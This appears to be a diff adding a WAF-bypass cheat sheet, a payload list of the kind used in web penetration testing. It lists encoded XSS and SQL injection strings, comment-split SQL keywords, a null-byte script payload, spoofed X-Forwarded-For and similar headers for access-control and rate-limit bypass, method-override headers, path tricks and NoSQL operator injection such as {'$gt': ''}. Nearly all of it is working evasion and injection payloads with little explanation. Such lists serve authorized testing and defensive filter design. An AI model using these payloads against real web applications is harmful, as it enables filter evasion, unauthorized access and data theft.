@@ -1,0 +1,168 @@
+# ============================================================================
+# WAF BYPASS TECHNIQUES
+# ============================================================================
+# General techniques to bypass Web Application Firewalls
+# ============================================================================
+
+# =================== ENCODING TECHNIQUES ===================
+
+# URL Encoding (Single)
+%27 = '
+%22 = "
+%3C = <
+%3E = >
+%3D = =
+%20 = space
+%0A = newline
+%0D = carriage return
+%09 = tab
+
+# URL Encoding (Double)
+%2527 = %27 = '
+%2522 = %22 = "
+%253C = %3C = <
+%253E = %3E = >
+
+# URL Encoding (Triple)
+%252527 = '
+
+# Unicode Encoding
+%u0027 = '
+%u003C = <
+%u003E = >
+
+# Hex Encoding
+\x27 = '
+\x3C = <
+\x3E = >
+
+# HTML Entity Encoding
+&lt; = <
+&gt; = >
+&quot; = "
+&apos; = '
+&#x27; = '
+&#39; = '
+&#60; = <
+&#62; = >
+
+# Base64
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== = <script>alert(1)</script>
+J09SJzE9Jzc= = 'OR'1='1
+
+# =================== CASE VARIATIONS ===================
+
+SELECT → SeLeCt, sElEcT, SELECT
+UNION → UnIoN, uNiOn, UNION
+SCRIPT → ScRiPt, sCrIpT, SCRIPT
+ALERT → AlErT, aLeRt, ALERT
+ONERROR → OnError, oNeRrOr, ONERROR
+
+# =================== WHITESPACE BYPASS ===================
+
+# Replace Space With:
+/**/
++
+%09 (tab)
+%0A (newline)
+%0C (form feed)
+%0D (carriage return)
+%A0 (non-breaking space)
+/**_**/
+
+# Examples:
+SELECT/**/1
+SELECT+1
+SELECT%091
+UNION/**/SELECT
+UNION+SELECT
+
+# =================== COMMENT INJECTION ===================
+
+# SQL Comments
+/**/
+/*!*/
+/*!50000*/
+-- 
+#
+;--
+;#
+
+# Examples:
+UN/**/ION/**/SE/**/LECT
+UNI/*!ON*//*!SELECT*/
+/*!50000UNION*//*!50000SELECT*/
+
+# =================== NULL BYTE INJECTION ===================
+%00
+\0
+\x00
+
+# Example:
+<scri%00pt>alert(1)</scri%00pt>
+
+# =================== CHUNKED TRANSFER ===================
+# Split payload across chunks
+
+# =================== HTTP PARAMETER POLLUTION ===================
+# Multiple same parameters
+?id=1&id=2  (different servers handle differently)
+
+# =================== HTTP VERB TAMPERING ===================
+# Try different HTTP methods
+GET → POST, PUT, PATCH, OPTIONS, HEAD
+
+# =================== CONTENT-TYPE MANIPULATION ===================
+Content-Type: application/json
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+Content-Type: text/xml
+
+# =================== HEADER INJECTION ===================
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+
+# =================== REQUEST SMUGGLING ===================
+# CL.TE / TE.CL / TE.TE vulnerabilities
+
+# =================== FRAGMENTATION ===================
+# IP fragmentation to bypass IDS/IPS
+
+# =================== RATE LIMIT BYPASS ===================
+# Add headers to appear as different clients
+X-Forwarded-For: random_ip
+Client-IP: random_ip
+
+# =================== PATH NORMALIZATION ===================
+/api/v1/users → /api/./v1/users
+/api/v1/users → /api/v1/./users
+/api/v1/users → /api/v1/users/
+/api/v1/users → /Api/V1/Users
+/api/v1/users → /API/V1/USERS
+/api/v1/users → /api%2fv1%2fusers
+
+# =================== PROTOCOL DOWNGRADE ===================
+# Force HTTP/1.0 instead of HTTP/1.1
+
+# =================== CUSTOM HEADERS ===================
+X-Custom-IP-Authorization: 127.0.0.1
+X-HTTP-Method-Override: PUT
+X-Method-Override: PUT
+
+# =================== JSON BYPASS ===================
+{"username": "admin", "password": "admin"} → {"username": "admin", "password": {"$gt": ""}}
+{"id": 1} → {"id": {"$ne": null}}
+
+# =================== BOUNDARY TESTING ===================
+# Very long strings
+# Very short strings
+# Boundary values (0, -1, MAX_INT+1)
+# Special characters
+
+# =================== TIME DELAYS ===================
+# Slow requests to avoid rate limiting
+# Sleep between requests
